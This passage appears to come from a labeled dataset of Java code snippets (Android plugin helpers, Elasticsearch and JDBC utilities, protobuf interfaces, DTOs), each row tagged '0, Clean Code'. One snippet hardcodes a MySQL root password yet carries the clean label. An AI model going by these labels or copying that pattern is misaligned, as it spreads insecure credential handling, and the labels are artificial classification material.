  public static void fragmentStartActivity(  Fragment fragment,  Intent intent){
    fragmentStartActivity(fragment,intent,null);
  }
  @SuppressLint(""NewApi"") public static void fragmentStartActivity(  Fragment fragment,  Intent intent,  Bundle options){
    ShadowContext shadowContext=fragmentGetActivity(fragment);
    Intent containerActivityIntent=shadowContext.mPluginComponentLauncher.convertPluginActivityIntent(intent);
    if (options == null) {
      fragment.startActivity(containerActivityIntent);
    }
 else {
      fragment.startActivity(containerActivityIntent,options);
    }
  }
  public static void fragmentStartActivityForResult(  Fragment fragment,  Intent intent,  int requestCode){
    fragmentStartActivityForResult(fragment,intent,requestCode,null);
  }
  public static void fragmentStartActivityForResult(  Fragment fragment,  Intent intent,  int requestCode,  Bundle options){
    ShadowContext shadowContext=fragmentGetActivity(fragment);
    Intent containerActivityIntent=shadowContext.mPluginComponentLauncher.convertPluginActivityIntent(intent);
    if (options == null) {
      fragment.startActivityForResult(containerActivityIntent,requestCode);
    }
 else {
      fragment.startActivityForResult(containerActivityIntent,requestCode,options);
    }
  }
  public static Context toPluginContext(  Context pluginContainerActivity){
    return PluginActivity.get((PluginContainerActivity)pluginContainerActivity);
  }
  public static Context toOriginalContext(  Context pluginActivity){
    PluginActivity activity=(PluginActivity)pluginActivity;
    return activity.hostActivityDelegator.getHostActivity().getImplementActivity();
  }
}
public class ShadowFragmentSupport {
  public static ShadowActivity fragmentGetActivity(  Fragment fragment){
    return null;
  }
  public static Context fragmentGetContext(  Fragment fragment){
    return null;
  }
  public static Object fragmentGetHost(  Fragment fragment){
    return null;
  }
  public void fragmentStartActivity(  Fragment fragment,  Intent intent){
  }
  public void fragmentStartActivity(  Fragment fragment,  Intent intent,  Bundle options){
  }
  public static void fragmentStartActivityForResult(  Fragment fragment,  Intent intent,  int requestCode){
  }
  public static void fragmentStartActivityForResult(  Fragment fragment,  Intent intent,  int requestCode,  Bundle options){
  }
  public static Context toPluginContext(  Context pluginContainerActivity){
    return null;
  }
  public static Context toOriginalContext(  Context pluginActivity){
    return null;
  }
}
",0,Clean Code
"/** 
 * es自动配置
 * @author zlt
 * @date 2020/3/28<p> Blog: http://zlt2000.gitee.io Github: https://github.com/zlt2000
 */
@EnableConfigurationProperties(RestClientPoolProperties.class) public class RestAutoConfigure extends AbstractElasticsearchConfiguration {
  private final static String SCHEME=""http"";
  private final static String URI_SPLIT="":"";
  @Resource private ElasticsearchProperties restProperties;
  @Resource private RestClientPoolProperties poolProperties;
  @Override public RestHighLevelClient elasticsearchClient(){
    List<String> urlArr=restProperties.getUris();
    HttpHost[] httpPostArr=new HttpHost[urlArr.size()];
    for (int i=0; i < urlArr.size(); i++) {
      HttpHost httpHost=new HttpHost(urlArr.get(i).split(URI_SPLIT)[0].trim(),Integer.parseInt(urlArr.get(i).split(URI_SPLIT)[1].trim()),SCHEME);
      httpPostArr[i]=httpHost;
    }
    final CredentialsProvider credentialsProvider=new BasicCredentialsProvider();
    credentialsProvider.setCredentials(AuthScope.ANY,new UsernamePasswordCredentials(restProperties.getUsername(),restProperties.getPassword()));
    RestClientBuilder builder=RestClient.builder(httpPostArr).setHttpClientConfigCallback(httpClientBuilder -> {
      httpClientBuilder.setDefaultCredentialsProvider(credentialsProvider);
      httpClientBuilder.setMaxConnTotal(poolProperties.getMaxConnectNum()).setMaxConnPerRoute(poolProperties.getMaxConnectPerRoute());
      return httpClientBuilder;
    }
).setRequestConfigCallback(requestConfigBuilder -> {
      requestConfigBuilder.setConnectTimeout(poolProperties.getConnectTimeOut()).setSocketTimeout(poolProperties.getSocketTimeOut()).setConnectionRequestTimeout(poolProperties.getConnectionRequestTimeOut());
      return requestConfigBuilder;
    }
);
    return new RestHighLevelClient(builder);
  }
}
",0,Clean Code
"/** 
 * 某人創作的漫画
 */
public class FragmentUserManga extends NetListFragment<FragmentBaseListBinding,ListIllust,IllustsBean> {
  private int userID;
  private boolean showToolbar=false;
  public static FragmentUserManga newInstance(  int userID,  boolean paramShowToolbar){
    Bundle args=new Bundle();
    args.putInt(Params.USER_ID,userID);
    args.putBoolean(Params.FLAG,paramShowToolbar);
    FragmentUserManga fragment=new FragmentUserManga();
    fragment.setArguments(args);
    return fragment;
  }
  @Override public void initBundle(  Bundle bundle){
    userID=bundle.getInt(Params.USER_ID);
    showToolbar=bundle.getBoolean(Params.FLAG);
  }
  @Override public void initView(){
    super.initView();
    baseBind.toolbar.inflateMenu(R.menu.local_save);
    baseBind.toolbar.setOnMenuItemClickListener(new Toolbar.OnMenuItemClickListener(){
      @Override public boolean onMenuItemClick(      MenuItem item){
        if (item.getItemId() == R.id.action_bookmark) {
          FeatureEntity entity=new FeatureEntity();
          entity.setUuid(userID + ""漫画作品"");
          entity.setShowToolbar(showToolbar);
          entity.setDataType(""漫画作品"");
          entity.setIllustJson(Common.cutToJson(allItems));
          entity.setUserID(userID);
          entity.setDateTime(System.currentTimeMillis());
          AppDatabase.getAppDatabase(mContext).downloadDao().insertFeature(entity);
          Common.showToast(""已收藏到精华"");
          return true;
        }
        return false;
      }
    }
);
  }
  @Override public RemoteRepo<ListIllust> repository(){
    return new UserMangaRepo(userID);
  }
  @Override public BaseAdapter<IllustsBean,RecyIllustStaggerBinding> adapter(){
    return new IAdapter(allItems,mContext);
  }
  @Override public boolean showToolbar(){
    return showToolbar;
  }
  @Override public String getToolbarTitle(){
    if (showToolbar) {
      return getString(R.string.string_233);
    }
 else {
      return super.getToolbarTitle();
    }
  }
  @Override public void initRecyclerView(){
    staggerRecyclerView();
  }
}
",0,Clean Code
"/** 
 * JustAuth  {@code Request}公共接口，所有平台的 {@code Request}都需要实现该接口 <p> {@link AuthRequest#authorize()}{@link AuthRequest#authorize(String)}{@link AuthRequest#login(AuthCallback)}{@link AuthRequest#revoke(AuthToken)}{@link AuthRequest#refresh(AuthToken)}
 * @author yadong.zhang (yadong.zhang0415(a)gmail.com)
 * @since 1.8
 */
public interface AuthRequest {
  /** 
 * 返回授权url，可自行跳转页面 <p> 不建议使用该方式获取授权地址，不带 {@code state}的授权地址，容易受到csrf攻击。 建议使用 {@link AuthDefaultRequest#authorize(String)}方法生成授权地址，在回调方法中对 {@code state}进行校验
 * @return 返回授权地址
 */
  @Deprecated default String authorize(){
    throw new AuthException(AuthResponseStatus.NOT_IMPLEMENTED);
  }
  /** 
 * 返回带 {@code state}参数的授权url，授权回调时会带上这个 {@code state}
 * @param state state 验证授权流程的参数，可以防止csrf
 * @return 返回授权地址
 */
  default String authorize(  String state){
    throw new AuthException(AuthResponseStatus.NOT_IMPLEMENTED);
  }
  /** 
 * 获取access token
 * @param authCallback 授权成功后的回调参数
 * @return token
 * @see AuthDefaultRequest#authorize()
 * @see AuthDefaultRequest#authorize(String)
 */
  AuthToken getAccessToken(  AuthCallback authCallback);
  /** 
 * 使用token换取用户信息
 * @param authToken token信息
 * @return 用户信息
 * @see AuthDefaultRequest#getAccessToken(AuthCallback)
 */
  AuthUser getUserInfo(  AuthToken authToken);
  /** 
 * 第三方登录
 * @param authCallback 用于接收回调参数的实体
 * @return 返回登录成功后的用户信息
 */
  default AuthResponse<AuthUser> login(  AuthCallback authCallback){
    throw new AuthException(AuthResponseStatus.NOT_IMPLEMENTED);
  }
  /** 
 * 撤销授权
 * @param authToken 登录成功后返回的Token信息
 * @return AuthResponse
 */
  default AuthResponse revoke(  AuthToken authToken){
    throw new AuthException(AuthResponseStatus.NOT_IMPLEMENTED);
  }
  /** 
 * 刷新access token （续期）
 * @param authToken 登录成功后返回的Token信息
 * @return AuthResponse
 */
  default AuthResponse<AuthToken> refresh(  AuthToken authToken){
    throw new AuthException(AuthResponseStatus.NOT_IMPLEMENTED);
  }
}
",0,Clean Code
"public class JDBCDataSourceConfigurations {
  private static final Logger LOG=LoggerFactory.getLogger(JDBCDataSourceConfigurations.class);
  private final Map<String,Statement> taskIdStatementMap;
  public JDBCDataSourceConfigurations(){
    taskIdStatementMap=new ConcurrentHashMap<>();
  }
  public void initTaskIdStatementMap() throws SQLException {
    for (    Statement statement : taskIdStatementMap.values()) {
      if (statement != null && !statement.isClosed()) {
        statement.close();
      }
    }
    taskIdStatementMap.clear();
    LOG.info(""The jdbc task statement map has be cleared successfully!"");
  }
  public void saveStatement(  String taskId,  Statement statement){
    taskIdStatementMap.put(taskId,statement);
  }
  public void cancelStatement(  String taskId) throws SQLException {
    LOG.info(""Starting to cancel the statement of task {} ..."",taskId);
    Statement statement=taskIdStatementMap.get(taskId);
    if (statement != null) {
      statement.cancel();
    }
    LOG.info(""Finished cancel the statement of task {}."",taskId);
  }
  public void removeStatement(  String taskId){
    taskIdStatementMap.remove(taskId);
    LOG.info(""Finished remove the statement of task {}"",taskId);
  }
}
",0,Clean Code
"/** 
 * Desc: 定时捞取告警规则 Created by zhisheng on 2019-05-24 blog：http://www.54tianzhisheng.cn/ 微信公众号：zhisheng
 */
@Slf4j public class ScheduleMain {
  public static List<Rule> rules;
  public static void main(  String[] args) throws Exception {
    ScheduledExecutorService threadPool=Executors.newScheduledThreadPool(1);
    threadPool.scheduleAtFixedRate(new GetRulesJob(),0,1,TimeUnit.MINUTES);
    final ParameterTool parameterTool=ExecutionEnvUtil.createParameterTool(args);
    StreamExecutionEnvironment env=ExecutionEnvUtil.prepare(parameterTool);
    DataStreamSource<MetricEvent> source=KafkaConfigUtil.buildSource(env);
    source.map(new MapFunction<MetricEvent,MetricEvent>(){
      @Override public MetricEvent map(      MetricEvent value) throws Exception {
        if (rules.size() <= 2) {
          System.out.println(""===========2"");
        }
 else {
          System.out.println(""===========3"");
        }
        return value;
      }
    }
).print();
    env.execute(""schedule"");
  }
static class GetRulesJob implements Runnable {
    @Override public void run(){
      try {
        rules=getRules();
      }
 catch (      SQLException e) {
        log.error(""get rules from mysql has an error {}"",e.getMessage());
      }
    }
  }
  private static List<Rule> getRules() throws SQLException {
    System.out.println(""-----get rule"");
    String sql=""select * from rule"";
    Connection connection=MySQLUtil.getConnection(""com.mysql.jdbc.Driver"",""jdbc:mysql://localhost:3306/test?useUnicode=true&characterEncoding=UTF-8"",""root"",""root123456"");
    PreparedStatement ps=connection.prepareStatement(sql);
    ResultSet resultSet=ps.executeQuery();
    List<Rule> list=new ArrayList<>();
    while (resultSet.next()) {
      list.add(Rule.builder().id(resultSet.getString(""id"")).name(resultSet.getString(""name"")).type(resultSet.getString(""type"")).measurement(resultSet.getString(""measurement"")).threshold(resultSet.getString(""threshold"")).level(resultSet.getString(""level"")).targetType(resultSet.getString(""target_type"")).targetId(resultSet.getString(""target_id"")).webhook(resultSet.getString(""webhook"")).build());
    }
    return list;
  }
}
",0,Clean Code
"/** 
 * @author leix.xie
 * @date 2020/3/18 11:31
 * @describe
 */
public class DataSourceHelper {
  private static final Logger LOG=LoggerFactory.getLogger(DataSourceHelper.class);
  public static void closeResource(  ResultSet resultSet,  Statement statement,  Connection connection){
    closeResource(resultSet);
    closeResource(statement);
    closeResource(connection);
  }
  public static void closeResource(  ResultSet resultSet,  Statement statement){
    closeResource(resultSet);
    closeResource(statement);
  }
  public static void closeResource(  Statement statement,  Connection connection){
    closeResource(statement);
    closeResource(connection);
  }
  public static void closeResource(  Connection connection){
    if (connection != null) {
      try {
        connection.close();
      }
 catch (      SQLException e) {
        LOG.error(""close connection error"",e);
      }
    }
  }
  public static void closeResource(  Statement statement){
    if (statement != null) {
      try {
        statement.close();
      }
 catch (      SQLException e) {
        LOG.error(""close statement error"",e);
      }
    }
  }
  public static void closeResource(  ResultSet resultSet){
    if (resultSet != null) {
      try {
        resultSet.close();
      }
 catch (      SQLException e) {
        LOG.error(""close ResultSet error"",e);
      }
    }
  }
}
",0,Clean Code
"/** 
 * @author enjoyyin
 * @date 2022-03-14
 * @since 0.5.0
 */
public interface OrchestrationResponseRef extends ResponseRef {
  /** 
 * 对应于SchedulerAppConn（调度系统）的编排模式（一般就是调度系统的工作流）。
 * @return 返回调度系统的编排ID
 */
  Long getRefOrchestrationId();
  static ExternalBuilder newExternalBuilder(){
    return new ExternalBuilder();
  }
class ExternalBuilder extends ResponseRefBuilder.ExternalResponseRefBuilder<ExternalBuilder,OrchestrationResponseRef> {
    private Long refOrchestrationId;
    public ExternalBuilder setRefOrchestrationId(    Long refOrchestrationId){
      this.refOrchestrationId=refOrchestrationId;
      return this;
    }
    @Override protected OrchestrationResponseRef createResponseRef(){
      return new OrchestrationResponseRefImpl();
    }
class OrchestrationResponseRefImpl extends ResponseRefImpl implements OrchestrationResponseRef {
      public OrchestrationResponseRefImpl(){
        super(ExternalBuilder.this.responseBody,ExternalBuilder.this.status,ExternalBuilder.this.errorMsg,ExternalBuilder.this.responseMap);
      }
      @Override public Long getRefOrchestrationId(){
        return refOrchestrationId;
      }
    }
  }
}
",0,Clean Code
"/** 
 * This interface represents all scoreboard of Minecraft.
 */
public interface Scoreboard extends Viewable, PacketGroupingAudience {
  /** 
 * Creates a creation objective packet.
 * @param value The value for the objective
 * @param type  The type for the objective
 * @return the creation objective packet
 * @deprecated Use {@link #getCreationObjectivePacket(Component,ScoreboardObjectivePacket.Type)}
 */
  @Deprecated @NotNull default ScoreboardObjectivePacket getCreationObjectivePacket(  String value,  ScoreboardObjectivePacket.Type type){
    return this.getCreationObjectivePacket(Component.text(value),type);
  }
  /** 
 * Creates a creation objective packet.
 * @param value The value for the objective
 * @param type  The type for the objective
 * @return the creation objective packet
 */
  default @NotNull ScoreboardObjectivePacket getCreationObjectivePacket(  Component value,  ScoreboardObjectivePacket.Type type){
    return new ScoreboardObjectivePacket(getObjectiveName(),(byte)0,value,type,null);
  }
  /** 
 * Creates the destruction objective packet.
 * @return the destruction objective packet
 */
  default @NotNull ScoreboardObjectivePacket getDestructionObjectivePacket(){
    return new ScoreboardObjectivePacket(getObjectiveName(),(byte)1,null,null,null);
  }
  /** 
 * Creates the  {@link DisplayScoreboardPacket}.
 * @param position The position of the scoreboard
 * @return the created display scoreboard packet
 */
  default @NotNull DisplayScoreboardPacket getDisplayScoreboardPacket(  byte position){
    return new DisplayScoreboardPacket(position,getObjectiveName());
  }
  /** 
 * Updates the score of a  {@link Player}.
 * @param player The player
 * @param score  The new score
 */
  default void updateScore(  Player player,  int score){
  }
  /** 
 * Gets the objective name of the scoreboard.
 * @return the objective name
 */
  @NotNull String getObjectiveName();
  @Override default @NotNull Collection<Player> getPlayers(){
    return this.getViewers();
  }
}
",0,Clean Code
"public class MainActivity extends Activity {
  @Override protected void onCreate(  Bundle savedInstanceState){
    super.onCreate(savedInstanceState);
    setTheme(R.style.TestHostTheme);
    LinearLayout rootView=new LinearLayout(this);
    rootView.setOrientation(LinearLayout.VERTICAL);
    TextView infoTextView=new TextView(this);
    infoTextView.setText(R.string.main_activity_info);
    rootView.addView(infoTextView);
    final Spinner partKeySpinner=new Spinner(this);
    ArrayAdapter<String> partKeysAdapter=new ArrayAdapter<>(this,R.layout.part_key_adapter);
    partKeysAdapter.addAll(Constant.PART_KEY_PLUGIN_MAIN_APP);
    partKeySpinner.setAdapter(partKeysAdapter);
    rootView.addView(partKeySpinner);
    Button startPluginButton=new Button(this);
    startPluginButton.setText(R.string.start_plugin);
    startPluginButton.setOnClickListener(new View.OnClickListener(){
      @Override public void onClick(      View v){
        String partKey=(String)partKeySpinner.getSelectedItem();
        Intent intent=new Intent(MainActivity.this,PluginLoadActivity.class);
        intent.putExtra(Constant.KEY_PLUGIN_PART_KEY,partKey);
switch (partKey) {
case Constant.PART_KEY_PLUGIN_MAIN_APP:
          intent.putExtra(Constant.KEY_ACTIVITY_CLASSNAME,""com.tencent.shadow.test.plugin.general_cases.lib.usecases.application.TestApplicationActivity"");
        break;
    }
    startActivity(intent);
  }
}
);
rootView.addView(startPluginButton);
rootView.addView(new TestViewConstructorCacheView(this));
setContentView(rootView);
}
}
",0,Clean Code
"/** 
 * {@code Nag} is a Nesterov accelerated gradient optimizer.<p>This optimizer updates each weight by:<br> \( state = momentum * state + grad + wd *weight\)<br> \( weight = weight - (lr * (grad + momentum * state))<br>
 */
public class Nag extends Optimizer {
  private ParameterTracker learningRateTracker;
  private float momentum;
  private Map<String,Map<Device,NDArray>> momentumStates;
  /** 
 * Creates a new instance of  {@code Nag} optimizer.
 * @param builder the builder to create a new instance of {@code Nag} optimizer
 */
  protected Nag(  Builder builder){
    super(builder);
    learningRateTracker=builder.learningRateTracker;
    momentum=builder.momentum;
    momentumStates=new ConcurrentHashMap<>();
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void update(  String parameterId,  NDArray weight,  NDArray grad){
    float newLearningRate=learningRateTracker.getNewValue(parameterId,updateCount(parameterId));
    float weightDecay=getWeightDecay();
    NDList inputs;
    if (momentum != 0f) {
      inputs=new NDList(weight,grad,withDefaultState(momentumStates,parameterId,weight.getDevice(),k -> weight.zerosLike()));
    }
 else {
      inputs=new NDList(weight,grad);
    }
    NDList weights=new NDList(weight);
    NDArrayEx ex=weight.getNDArrayInternal();
    ex.nagUpdate(inputs,weights,newLearningRate,weightDecay,rescaleGrad,clipGrad,momentum);
  }
  /** 
 * The Builder to construct an  {@link Nag} object. 
 */
public static final class Builder extends OptimizerBuilder<Builder> {
    ParameterTracker learningRateTracker;
    float momentum;
    Builder(){
    }
    /** 
 * Sets the  {@link ParameterTracker} for this optimizer.
 * @param learningRateTracker the {@link ParameterTracker} to be set
 * @return this {@code Builder}
 */
    public Builder setLearningRateTracker(    ParameterTracker learningRateTracker){
      this.learningRateTracker=learningRateTracker;
      return this;
    }
    /** 
 * Sets the momentum for  {@link Nag}.
 * @param momentum the value of momentum
 * @return this {@code Builder}
 */
    public Builder setMomentum(    float momentum){
      this.momentum=momentum;
      return this;
    }
    /** 
 * {@inheritDoc} 
 */
    @Override protected Builder self(){
      return this;
    }
    /** 
 * Builds a  {@link Nag} block.
 * @return the {@link Nag} block
 */
    public Nag build(){
      Objects.requireNonNull(learningRateTracker,""No lrTracker set"");
      Preconditions.checkArgument(momentum != 0,""The momentum should be set"");
      return new Nag(this);
    }
  }
}
",0,Clean Code
"@Route(APIPath.Group_Get_Info) @HttpMethod(""POST"") public class GetGroupInfoAction extends AdminAction {
  @Override public boolean isTransactionAction(){
    return true;
  }
  @Override public boolean action(  Request request,  Response response){
    if (request.getNettyRequest() instanceof FullHttpRequest) {
      InputGetGroup inputGetGroup=getRequestBody(request.getNettyRequest(),InputGetGroup.class);
      if (inputGetGroup != null && (!StringUtil.isNullOrEmpty(inputGetGroup.getGroupId()))) {
        WFCMessage.GroupInfo groupInfo=messagesStore.getGroupInfo(inputGetGroup.getGroupId());
        RestResult result;
        if (groupInfo == null) {
          result=RestResult.resultOf(ErrorCode.ERROR_CODE_NOT_EXIST);
        }
 else {
          PojoGroupInfo pojoGroupInfo=new PojoGroupInfo();
          pojoGroupInfo.setExtra(groupInfo.getExtra());
          pojoGroupInfo.setName(groupInfo.getName());
          pojoGroupInfo.setOwner(groupInfo.getOwner());
          pojoGroupInfo.setPortrait(groupInfo.getPortrait());
          pojoGroupInfo.setTarget_id(groupInfo.getTargetId());
          pojoGroupInfo.setType(groupInfo.getType());
          pojoGroupInfo.setMember_count(groupInfo.getMemberCount());
          pojoGroupInfo.setMute(groupInfo.getMute());
          pojoGroupInfo.setJoin_type(groupInfo.getJoinType());
          pojoGroupInfo.setPrivate_chat(groupInfo.getPrivateChat());
          pojoGroupInfo.setSearchable(groupInfo.getSearchable());
          pojoGroupInfo.setMax_member_count(groupInfo.getMemberCount());
          pojoGroupInfo.setHistory_message(groupInfo.getHistoryMessage());
          pojoGroupInfo.setSuper_group(groupInfo.getSuperGroup() > 0);
          pojoGroupInfo.setDeleted(groupInfo.getDeleted() > 0);
          pojoGroupInfo.setUpdate_dt(groupInfo.getUpdateDt());
          pojoGroupInfo.setMember_update_dt(groupInfo.getMemberUpdateDt());
          result=RestResult.ok(pojoGroupInfo);
        }
        setResponseContent(result,response);
      }
 else {
        setResponseContent(RestResult.resultOf(ErrorCode.INVALID_PARAMETER),response);
      }
    }
    return true;
  }
}
",0,Clean Code
"/** 
 * @author shuzijun
 */
public class TimerBarWidget implements CustomStatusBarWidget {
  public final static String ID=PluginConstant.LEETCODE_TIMER_BAR_WIDGET;
  private Long second=0L;
  private String name="""";
  private Project project;
  private static Color Level1=new Color(92,184,92);
  private static Color Level2=new Color(240,173,78);
  private static Color Level3=new Color(217,83,79);
  public TimerBarWidget(  Project project){
    this.project=project;
    loaColor(PersistentConfig.getInstance().getInitConfig());
    MessageBusConnection messageBusConnection=ApplicationManager.getApplication().getMessageBus().connect(this);
    messageBusConnection.subscribe(ConfigNotifier.TOPIC,(oldConfig,newConfig) -> loaColor(newConfig));
  }
  private void loaColor(  Config config){
    if (config != null) {
      Color[] colors=config.getFormatLevelColour();
      Level1=colors[0];
      Level2=colors[1];
      Level3=colors[2];
    }
  }
  private JLabel label=new JLabel(time());
  private Timer timer=new Timer(1000,new AbstractAction(){
    @Override public void actionPerformed(    ActionEvent e){
      second+=1;
      if (second < 30 * 60) {
        label.setForeground(Level1);
      }
 else       if (second < 60 * 60) {
        label.setForeground(Level2);
      }
 else {
        label.setForeground(Level3);
      }
      label.setText(time());
    }
  }
);
  private String time(){
    return String.format(""[%s]%02d:%02d:%02d"",name,second / 60 / 60,second / 60 % 60,second % 60);
  }
  @Override public JComponent getComponent(){
    return label;
  }
  @NotNull @Override public String ID(){
    return ID;
  }
  @Override public void install(  @NotNull StatusBar statusBar){
    label.setVisible(false);
    label.addMouseListener(new MouseAdapter(){
      @Override public void mouseClicked(      MouseEvent e){
        if (timer.isRunning()) {
          timer.stop();
        }
 else {
          timer.start();
        }
      }
    }
);
  }
  @Override public void dispose(){
    timer.stop();
  }
  public void startTimer(  String name){
    if (!this.name.equals(name)) {
      this.name=name;
      this.second=0L;
    }
    timer.start();
    if (!label.isVisible()) {
      label.setVisible(true);
    }
  }
  public void stopTimer(){
    timer.stop();
  }
  public void reset(){
    this.name="""";
    this.second=0L;
    timer.stop();
    label.setVisible(false);
  }
}
",0,Clean Code
"/** 
 * <p> 字典编码信息表 服务实现类 </p>
 * @author yuwei
 * @date 2022-04-17
 */
@Service @Transactional(propagation=Propagation.SUPPORTS,readOnly=true,rollbackFor=Exception.class) public class DictServiceImpl extends BaseServiceImpl<DictDao,DictEntity> implements DictService {
  @Autowired private DictDao dictDao;
  @Autowired private DictMapper dictMapper;
  @Autowired private RedisService redisService;
  @Override @Transactional(rollbackFor=Exception.class) public DictEntity saveDict(  DictDto dictDto){
    DictEntity dict=dictMapper.toEntity(dictDto);
    int n=dictDao.selectCount(Wrappers.<DictEntity>lambdaQuery().eq(DictEntity::getDictCode,dict.getDictCode()));
    if (n > 0) {
      throw new DataException(""该字典编码已存在"");
    }
    dictDao.insert(dict);
    return dict;
  }
  @Override @Transactional(rollbackFor=Exception.class) public DictEntity updateDict(  DictDto dictDto){
    DictEntity dict=dictMapper.toEntity(dictDto);
    dictDao.updateById(dict);
    return dict;
  }
  @Override @Transactional(rollbackFor=Exception.class) public void deleteDictById(  String id){
    dictDao.deleteById(id);
  }
  @Override @Transactional(rollbackFor=Exception.class) public void deleteDictBatch(  List<String> ids){
    dictDao.deleteBatchIds(ids);
  }
  @Override public List<DictItemEntity> getDictItems(  String code){
    List<DictEntity> dictEntityList=(List<DictEntity>)redisService.get(RedisConstant.SYSTEM_DICT_KEY);
    Optional<DictEntity> dictEntityOptional=dictEntityList.stream().filter(s -> code.equals(s.getDictCode())).findFirst();
    if (dictEntityOptional.isPresent()) {
      return dictEntityOptional.get().getItems();
    }
    return null;
  }
  @Override public void refreshDict(){
    String key=RedisConstant.SYSTEM_DICT_KEY;
    Boolean hasKey=redisService.hasKey(key);
    if (hasKey) {
      redisService.del(key);
    }
    List<DictEntity> dictEntityList=dictDao.queryDictList(DataConstant.EnableState.ENABLE.getKey());
    redisService.set(key,dictEntityList);
  }
}",0,Clean Code
"public interface RemovePeerRequestOrBuilder extends com.google.protobuf.MessageOrBuilder {
  /** 
 * <code>required string group_id = 1;</code>
 */
  boolean hasGroupId();
  /** 
 * <code>required string group_id = 1;</code>
 */
  java.lang.String getGroupId();
  /** 
 * <code>required string group_id = 1;</code>
 */
  com.google.protobuf.ByteString getGroupIdBytes();
  /** 
 * <code>required string leader_id = 2;</code>
 */
  boolean hasLeaderId();
  /** 
 * <code>required string leader_id = 2;</code>
 */
  java.lang.String getLeaderId();
  /** 
 * <code>required string leader_id = 2;</code>
 */
  com.google.protobuf.ByteString getLeaderIdBytes();
  /** 
 * <code>required string peer_id = 3;</code>
 */
  boolean hasPeerId();
  /** 
 * <code>required string peer_id = 3;</code>
 */
  java.lang.String getPeerId();
  /** 
 * <code>required string peer_id = 3;</code>
 */
  com.google.protobuf.ByteString getPeerIdBytes();
}",0,Clean Code
"public interface InstallSnapshotRequestOrBuilder extends com.google.protobuf.MessageOrBuilder {
  /** 
 * <code>required string group_id = 1;</code>
 */
  boolean hasGroupId();
  /** 
 * <code>required string group_id = 1;</code>
 */
  java.lang.String getGroupId();
  /** 
 * <code>required string group_id = 1;</code>
 */
  com.google.protobuf.ByteString getGroupIdBytes();
  /** 
 * <code>required string server_id = 2;</code>
 */
  boolean hasServerId();
  /** 
 * <code>required string server_id = 2;</code>
 */
  java.lang.String getServerId();
  /** 
 * <code>required string server_id = 2;</code>
 */
  com.google.protobuf.ByteString getServerIdBytes();
  /** 
 * <code>required string peer_id = 3;</code>
 */
  boolean hasPeerId();
  /** 
 * <code>required string peer_id = 3;</code>
 */
  java.lang.String getPeerId();
  /** 
 * <code>required string peer_id = 3;</code>
 */
  com.google.protobuf.ByteString getPeerIdBytes();
  /** 
 * <code>required int64 term = 4;</code>
 */
  boolean hasTerm();
  /** 
 * <code>required int64 term = 4;</code>
 */
  long getTerm();
  /** 
 * <code>required .jraft.SnapshotMeta meta = 5;</code>
 */
  boolean hasMeta();
  /** 
 * <code>required .jraft.SnapshotMeta meta = 5;</code>
 */
  com.alipay.sofa.jraft.entity.RaftOutter.SnapshotMeta getMeta();
  /** 
 * <code>required .jraft.SnapshotMeta meta = 5;</code>
 */
  com.alipay.sofa.jraft.entity.RaftOutter.SnapshotMetaOrBuilder getMetaOrBuilder();
  /** 
 * <code>required string uri = 6;</code>
 */
  boolean hasUri();
  /** 
 * <code>required string uri = 6;</code>
 */
  java.lang.String getUri();
  /** 
 * <code>required string uri = 6;</code>
 */
  com.google.protobuf.ByteString getUriBytes();
}",0,Clean Code
"/** 
 * <p> 登录日志信息表 实体DTO </p>
 * @author AllDataDC
 * @since 2023-01-29
 */
@ApiModel(value=""登录日志信息表Model"") @Data public class LoginLogDto implements Serializable {
  private static final long serialVersionUID=1L;
  @ApiModelProperty(value=""主键ID"") private String id;
  @ApiModelProperty(value=""操作系统"") private String opOs;
  @ApiModelProperty(value=""浏览器类型"") private String opBrowser;
  @ApiModelProperty(value=""登录IP地址"") private String opIp;
  @ApiModelProperty(value=""登录时间"") private LocalDateTime opDate;
  @ApiModelProperty(value=""登录用户ID"") private String userId;
  @ApiModelProperty(value=""登录用户名称"") private String userName;
}
/** 
 * <p> 登录日志信息表 实体DTO </p>
 * @author yuwei
 * @date 2022-05-29
 */
@ApiModel(value=""登录日志信息表Model"") @Data public class LoginLogDto implements Serializable {
  private static final long serialVersionUID=1L;
  @ApiModelProperty(value=""主键ID"") private String id;
  @ApiModelProperty(value=""操作系统"") private String opOs;
  @ApiModelProperty(value=""浏览器类型"") private String opBrowser;
  @ApiModelProperty(value=""登录IP地址"") private String opIp;
  @ApiModelProperty(value=""登录时间"") private LocalDateTime opDate;
  @ApiModelProperty(value=""登录用户ID"") private String userId;
  @ApiModelProperty(value=""登录用户名称"") private String userName;
}",0,Clean Code
"public interface GroupMemberOrBuilder extends com.google.protobuf.MessageOrBuilder {
  /** 
 * <code>required string member_id = 1;</code>
 */
  boolean hasMemberId();
  /** 
 * <code>required string member_id = 1;</code>
 */
  java.lang.String getMemberId();
  /** 
 * <code>required string member_id = 1;</code>
 */
  com.google.protobuf.ByteString getMemberIdBytes();
  /** 
 * <code>optional string alias = 2;</code>
 */
  boolean hasAlias();
  /** 
 * <code>optional string alias = 2;</code>
 */
  java.lang.String getAlias();
  /** 
 * <code>optional string alias = 2;</code>
 */
  com.google.protobuf.ByteString getAliasBytes();
  /** 
 * <code>required int32 type = 3;</code>
 */
  boolean hasType();
  /** 
 * <code>required int32 type = 3;</code>
 */
  int getType();
  /** 
 * <code>optional int64 update_dt = 4;</code>
 */
  boolean hasUpdateDt();
  /** 
 * <code>optional int64 update_dt = 4;</code>
 */
  long getUpdateDt();
  /** 
 * <code>optional int64 create_dt = 5;</code>
 */
  boolean hasCreateDt();
  /** 
 * <code>optional int64 create_dt = 5;</code>
 */
  long getCreateDt();
  /** 
 * <code>optional string extra = 6;</code>
 */
  boolean hasExtra();
  /** 
 * <code>optional string extra = 6;</code>
 */
  java.lang.String getExtra();
  /** 
 * <code>optional string extra = 6;</code>
 */
  com.google.protobuf.ByteString getExtraBytes();
}
",0,Clean Code
"/** 
 * {@link ObjectComparator}<p> can compare complex object
 * @author zhaoyb1990
 */
@MetaInfServices(Comparator.class) public class ObjectComparator implements Comparator {
  @Override public int order(){
    return 1;
  }
  @Override public boolean accept(  Object left,  Object right){
    return left != null && right != null;
  }
  @Override public void compare(  Object left,  Object right,  List<Path> paths,  IntegratedComparator comparator){
    Class<?> lCs=left.getClass();
    Class<?> rCs=right.getClass();
    if (lCs != rCs) {
      comparator.addDifference(left,right,Difference.Type.TYPE_DIFF,paths);
      return;
    }
    innerCompare(lCs,left,right,paths,comparator);
  }
  @Override public boolean support(  CompareMode compareMode){
    return true;
  }
  /** 
 * inner recursively dispatch field with reflect access
 * @param clazz      class of two instance
 * @param left       the left object to handle
 * @param right      the right object to handle
 * @param paths      current node paths
